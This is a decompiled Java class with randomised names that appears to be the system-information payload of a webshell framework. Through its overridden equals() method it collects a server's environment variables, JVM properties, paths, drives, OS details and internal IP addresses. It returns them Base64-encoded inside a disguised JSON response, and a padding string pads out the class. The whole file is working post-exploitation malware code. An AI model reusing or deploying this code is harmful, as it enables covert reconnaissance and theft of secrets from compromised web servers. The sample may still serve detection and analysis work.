/*
 * Decompiled with CFR.
 */
package sun.qihzbyt;

import java.io.File;
import java.lang.Class;
import java.lang.Exception;
import java.lang.Integer;
import java.lang.Object;
import java.lang.String;
import java.lang.StringBuilder;
import java.lang.System;
import java.lang.Throwable;
import java.lang.reflect.Method;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Base64;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;
import java.util.Random;
import java.util.Set;

/*
 * This class specifies class file version 49.0 but uses Java 6 signatures.  Assumed Java 6.
 */
public class Iiggnrry {
    public static String whatever;
    private Object Request;
    private Object Response;
    private Object Session;

    public Iiggnrry() {
        whatever = "";
        whatever = whatever + "eN3DnaBdsYeWJCSQ74sBFFcBJEus203oO2NvhUORax971X8aEZjqQ6PMEtg69QtfSesaLV6TYm7CdLknJTSy0mPAEHVy4FPYvFFmjjV7Pr37lVN8iBVEZVbW3FBjtFpMIIcsxyvSLUWxTsuCcr4QAQbcwyaY5zO1oDfe2fB4yfgE7Nh5DDIcsoIXIFnlToja6G9WOC08rsrO3UJ2nOVXhuuxY0m6bzM62noPWY5DWEcBdSfophvYcDOtvJkkDsNtuE7XkljzHLZxT4TrEcZzCJY6QxqLeQXdLkEIcHukpDcLXFTwXC3a1txSI71P5hzNFzJcOl6GMcCOt2iMffDhfnOJQKMs01G55xVB8XnFBWFkRvvuPlxKYvBJJlEI418Tsglsq0yrWGxYGD6nYgPFmZ3U4id96wlDkbREYAysfAB703yDCTp8a3ASYu7JWyOjAurzCycADasAw4W0f2RwHIaZ9V03vgwpUQ8VznMRcUfHivKr2BdbFsunMXcK5P4HRQaAZ3UVsQDURhIHbEDox8BejHj3Zyszk9jlHT6iKu6VjqJNfjR7MTuRXl9TFgW3s82mL6e2LXQjUXIm2BRm0xJE2BTYa6x5S3sNoxcG7x3H8Fvwn3g8sVOffLpoMu4PE379gd1e20JuBiZ34fG5KuShCjRfvvp5iEDqyJdgbITWvwQUm9VVYVcvkZATnskHDQdAtM7DcBn6GQS6enE6KnHxjjYWGQ2nLT7fZqCYLEZRk6TQ7qUEVbhMMuP82CAWGyx0rowFnjaLnlVVAkJghwU7o6PUlA6wdd6Xo7gPAqdmjeiPEM9bxAhLs1iIBrNVyinMc5KJFdSY6hUDEIJCzo5TJROcNEGUSvM4RB464EhXWdlERUVd0t6lb2Q5da5O1I99y5e3uUPGDmfc2jPqYXMbw7GMcS81XihdutyO3dYFA6tOeoAhaHAkvYeUoSGGZ6U1BEgXKNOLlkxLAjvk2zX7cVNr0zigBebLhxLBKa4eZ5ULSRwpy3XHP2bEOA4Ej9vp2i09SwxYK1tfpqB0GSxzL7GYpqTJkKlClByM9G7GVdMSXBpkINAVQ1ZjQYNzrzQIcgPxgM02oILchWMTlUmZ7OpCrH5mq7zn8CXwqEN05p90dkHXpz0sUEhAvT2DTrzwJYQ4WcG0KHPHAeYfxSgCWfGOPtykDzVFoOTuX8gervGdI8lTukcLbJ84VCEpghwAf8LOtI2VI1YXXgnl0wq9CTT0zouKmNaAIo7I7eVGpQbA8NLwRW0lA75TFTwaeReVrPYD9XAJ0HwCIwv8lk2amDuTvw7sKCmNWcmlEfgmHPICIpdZEDXZ7tXuuzap1MMunVFwoYMd4RLJbdAQMJfsUtIW5nlbdXPnsMRmi1hMf1JsjS2JFOdEutlDmljt3VOGXMJPokmA5ouRqD8evs6YZbpVCwx0p";
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public boolean equals(Object obj) {
        HashMap<String, String> result = new HashMap<String, String>();
        try {
            File[] roots;
            this.fillContext(obj);
            StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量:</font><br/>");
            Map<String, String> env = System.getenv();
            for (String name : env.keySet()) {
                basicInfo.append(name + "=" + env.get(name) + "<br/>");
            }
            basicInfo.append("<br/><font size=2 color=red>JRE系统属性:</font><br/>");
            Properties props = System.getProperties();
            Set entrySet = props.entrySet();
            for (Map.Entry entry : entrySet) {
                basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
            }
            String currentPath = new File("").getAbsolutePath();
            String driveList = "";
            for (File f : roots = File.listRoots()) {
                driveList = driveList + f.getPath() + ";";
            }
            String osInfo = System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch");
            HashMap<String, String> entity = new HashMap<String, String>();
            entity.put("basicInfo", basicInfo.toString());
            entity.put("currentPath", currentPath);
            entity.put("driveList", driveList);
            entity.put("osInfo", osInfo);
            entity.put("arch", System.getProperty("os.arch"));
            entity.put("localIp", this.getInnerIp());
            result.put("status", "success");
            result.put("msg", this.buildJson(entity, true));
        }
        catch (Exception so) {
            try {
                Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so2.getClass().getMethod("write", byte[].class);
                write.invoke(so2, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
                return true;
            }
            catch (Exception exception) {
                return true;
            }
        }
        catch (Throwable throwable) {
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so.getClass().getMethod("write", byte[].class);
                write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                throw throwable;
            }
            catch (Exception exception) {
                // empty catch block
            }
            throw throwable;
        }
        try {
            Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
            Method write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
            so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
            so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            return true;
        }
        catch (Exception so) {
            return true;
        }
    }

    private String getInnerIp() {
        String ips = "";
        try {
            Enumeration<NetworkInterface> netInterfaces = NetworkInterface.getNetworkInterfaces();
            InetAddress ip = null;
            while (netInterfaces.hasMoreElements()) {
                NetworkInterface netInterface = netInterfaces.nextElement();
                Enumeration<InetAddress> addresses = netInterface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    ip = addresses.nextElement();
                    if (ip == null || !(ip instanceof Inet4Address)) continue;
                    ips = ips + ip.getHostAddress() + " ";
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        ips = ips.replace("127.0.0.1", "").trim();
        return ips;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                Object Encoder;
                Class<?> Base64;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }

    private String base64encode(byte[] data) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        try {
            this.getClass();
            Class<?> Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{data});
        }
        catch (Throwable error) {
            this.getClass();
            Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = Base64.newInstance();
            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{data});
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map objMap = (Map)obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private byte[] getMagic() throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        Random random = new Random();
        byte[] buf = new byte[magicNum];
        for (int i = 0; i < buf.length; ++i) {
            buf[i] = (byte)random.nextInt(256);
        }
        return buf;
    }

    private byte[] Encrypt(byte[] byArray) throws Exception {
        String string = "{\"id\":\"1\",\"body\":{\"user\":\"lucky\"}}";
        string = string.replace("lucky", Base64.getEncoder().encodeToString(byArray).replace("+", "<").replace("/", ">"));
        return string.getBytes();
    }
}
